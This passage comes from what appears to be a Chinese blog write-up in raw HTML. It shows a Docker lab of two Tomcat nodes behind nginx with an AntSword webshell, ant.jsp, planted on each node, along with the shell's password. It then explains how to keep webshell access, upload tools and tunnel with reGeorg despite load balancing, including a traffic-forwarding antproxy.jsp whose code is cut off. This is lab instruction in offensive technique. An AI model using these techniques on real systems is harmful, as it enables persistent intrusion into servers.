class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos loadbalance-jsp]# docker-compose  up -d &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Building lbsnode1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Sending build context to Docker daemon  3.584kB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Step 1/3 : FROM tomcat:8-jre8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8-jre8: Pulling from library/tomcat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0e29546d541c: Pull complete &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9b829c73b52b: Pull complete &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cb5b7ae36172: Pull complete &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99ce012bef04: Pull complete &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22dc2a72d098: Pull complete &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9c69a57e10d9: Pull complete &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0c402b19a0b5: Pull complete &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8763e342e4d6: Pull complete &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b0c861fdc153: Pull complete &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ed0917d955ad: Pull complete &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Digest: sha256:5acd69685158898fda4eb4b854e2170068ced2c925ce9a364d214893e966fad6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Status: Downloaded newer image for tomcat:8-jre8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ---&amp;gt; cc1cf9719b23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Step 2/3 : COPY src/ant.jsp /usr/local/tomcat/webapps/ROOT/ant.jsp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ---&amp;gt; 47aa660fe449&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Step 3/3 : EXPOSE 8080&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ---&amp;gt; Running in 6c4c3ca597ba&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Removing intermediate container 6c4c3ca597ba&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ---&amp;gt; 5024db4a4111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Successfully built 5024db4a4111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Successfully tagged loadbalance-jsp_lbsnode1:latest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;WARNING: Image for service lbsnode1 was built because it did not already exist. To rebuild this image you must use `docker-compose build` or `docker-compose up --build`.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Building lbsnode2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Sending build context to Docker daemon  3.584kB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Step 1/3 : FROM tomcat:8-jre8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ---&amp;gt; cc1cf9719b23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Step 2/3 : COPY src/ant.jsp /usr/local/tomcat/webapps/ROOT/ant.jsp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ---&amp;gt; Using cache&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ---&amp;gt; 47aa660fe449&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Step 3/3 : EXPOSE 8080&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ---&amp;gt; Using cache&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ---&amp;gt; 5024db4a4111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Successfully built 5024db4a4111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Successfully tagged loadbalance-jsp_lbsnode2:latest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;WARNING: Image for service lbsnode2 was built because it did not already exist. To rebuild this image you must use `docker-compose build` or `docker-compose up --build`.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Pulling nginx (nginx:1.17)...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1.17: Pulling from library/nginx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;afb6ec6fdc1c: Pull complete&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b90c53a0b692: Pull complete&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11fa52a0fdc0: Pull complete&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Digest: sha256:6fff55753e3b34e36e24e37039ee9eae1fe38a6420d8ae16ef37c92d1eb26699&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Status: Downloaded newer image for nginx:1.17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Creating loadbalance-jsp_lbsnode1_1 ... done&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Creating loadbalance-jsp_lbsnode2_1 ... done&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Creating loadbalance-jsp_nginx_1    ... done&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos loadbalance-jsp]# docker ps -a &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CONTAINER ID   IMAGE                      COMMAND                  CREATED         STATUS                            PORTS                                     NAMES&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68569d913743   nginx:1.17                 &amp;quot;nginx -g &amp;#x27;daemon of…&amp;quot;   7 seconds ago   Up 6 seconds                      0.0.0.0:18080-&amp;gt;80/tcp, :::18080-&amp;gt;80/tcp   loadbalance-jsp_nginx_1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;f3175d7fbc4d   loadbalance-jsp_lbsnode2   &amp;quot;catalina.sh run&amp;quot;        9 seconds ago   Up 7 seconds                      8080/tcp                                  loadbalance-jsp_lbsnode2_1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36b280c80c6c   loadbalance-jsp_lbsnode1   &amp;quot;catalina.sh run&amp;quot;        9 seconds ago   Up 7 seconds                      8080/tcp                                  loadbalance-jsp_lbsnode1_1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225150810566.png&#34; alt=&#34;image-20221225150810566&#34;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Shell&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;密码&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;编码器&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;http://127.0.0.1:18080/ant.jsp&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;ant&lt;/code&gt;  ｜  &lt;code&gt;default&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;使用蚁剑连接&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225151010579.png&#34; alt=&#34;image-20221225151010579&#34;&gt;&lt;/p&gt;
&lt;p&gt;打开虚拟终端&lt;/p&gt;
&lt;p&gt;然后连接目标，因为两台节点都在相同的位置存在 ant.jsp，所以连接的时候也没出现什么异常&lt;/p&gt;
&lt;p&gt;但是我们会一直在两个节点上轮询&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225151054131.png&#34; alt=&#34;image-20221225151054131&#34;&gt;&lt;/p&gt;
&lt;p&gt;因为没有 ifconfig 和 ip a 命令，使用时需要安装 &lt;code&gt;apt install net-tools&lt;/code&gt; ，但是由于负载分担导致需要安装两次&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;难点一&lt;/strong&gt;：我们需要在&lt;strong&gt;每一台节点&lt;/strong&gt;的&lt;strong&gt;相同位置&lt;/strong&gt;都上传&lt;strong&gt;相同内容的 WebShell&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一旦有一台机器上没有，那么在请求轮到这台机器上的时候，就会出现 404 错误，影响使用。&lt;strong&gt;是的，这就是你出现一会儿正常，一会儿错误的原因。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;难点二&lt;/strong&gt;：我们在执行命令时，&lt;strong&gt;无法知道下次的请求交给哪台机器去执行&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;我们执行 ip addr 查看当前执行机器的 ip 时，可以看到一直在飘，因为我们用的是轮询的方式，还算能确定，一旦涉及了权重等其它指标，就让你好好体验一波什么叫飘乎不定。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225183659128.png&#34; alt=&#34;image-20221225183659128&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;难点三：&lt;strong&gt;当我们需要&lt;/strong&gt;上传一些工具&lt;/strong&gt;时，麻烦来了 **：**&lt;/p&gt;
&lt;p&gt;由于 antSword 上传文件时，采用的分片上传方式，把一个文件分成了多次 HTTP 请求发送给了目标，所以尴尬的事情来了，两台节点上，各一半，而且这一半到底是怎么组合的，取决于 LBS 算法&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;难点四：由于目标机器不能出外网，想进一步深入，只能使用 reGeorg/HTTPAbs 等 HTTP Tunnel，可在这个场景下，这些 tunnel 脚本全部都失灵了。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Plan A&lt;/strong&gt;  &lt;strong&gt;关掉其中一台机器&lt;/strong&gt; &lt;strong&gt;（作死）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;是的，首先想到的第一个方案是关机 / 停服，只保留一台机器，因为健康检查机制的存在，很快其它的节点就会被 nginx 从池子里踢出去，那么妥妥的就能继续了。&lt;/p&gt;
&lt;p&gt;影响业务，还会造成灾难，直接 Pass 不考虑。（实验环境下，权限够的时候是可以测试可行性的）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Plan B&lt;/strong&gt;   &lt;strong&gt;执行前先判断要不要执行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们既然无法预测下一次是哪台机器去执行，那我们的 Shell 在执行 Payload 之前，先判断一下要不要执行不就行了？&lt;/p&gt;
&lt;p&gt;以执行命令时 Bash 为例，在执行前判断一下 IP：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225183448234.png&#34; alt=&#34;image-20221225183448234&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Plan C&lt;/strong&gt;   &lt;strong&gt;在 Web 层做一次 HTTP 流量转发&lt;/strong&gt; &lt;strong&gt;（重点）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;没错，我们用 AntSword 没法直接访问 LBSNode1 内网 IP (172.23.0.2) 的 8080 端口，但是有人能访问呀，除了 nginx 能访问之外，&lt;strong&gt;LBSNode2 这台机器也是可以访问 Node1 这台机器的 8080 端口&lt;/strong&gt;的。&lt;/p&gt;
&lt;p&gt;还记不记得 「PHP Bypass Disable Function」 这个插件，我们在这个插件加载 so 之后，本地启动了一个 httpserver，然后我们用到了 HTTP 层面的流量转发脚本 「&lt;strong&gt;antproxy.php&lt;/strong&gt;」, 我们放在这个场景下看：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225152044677.png&#34; alt=&#34;image-20221225152044677&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们一步一步来看这个图，我们的目的是：&lt;strong&gt;所有的数据包都能发给「LBSNode 1」这台机器。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;首先是 第 1 步，我们请求 /antproxy.jsp，这个请求发给 nginx&lt;/p&gt;
&lt;p&gt;nginx 接到数据包之后，会有两种情况：&lt;/p&gt;
&lt;p&gt;我们先看黑色线，第 2 步把请求传递给了目标机器，请求了 Node1 机器上的 /antproxy.jsp，接着 第 3 步，/antproxy.jsp 把请求重组之后，传给了 Node1 机器上的 /ant.jsp，成功执行。&lt;/p&gt;
&lt;p&gt;再来看红色线，第 2 步把请求传给了 Node2 机器，接着第 3 步，Node2 机器上面的 /antproxy.jsp 把请求重组之后，传给了 Node1 的 /ant.jsp，成功执行。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.&lt;/strong&gt; &lt;strong&gt;创建 antproxy.jsp 脚本&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225183524538.png&#34; alt=&#34;image-20221225183524538&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;修改转发地址&lt;/strong&gt;，转向&lt;strong&gt;目标 Node&lt;/strong&gt; 的 内网 IP 的 &lt;strong&gt;目标脚本&lt;/strong&gt; 访问地址。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意：不仅仅是 WebShell 哟，还可以改成 reGeorg 等脚本的访问地址。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们将 target 指向了 LBSNode1 的 ant.jsp&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span 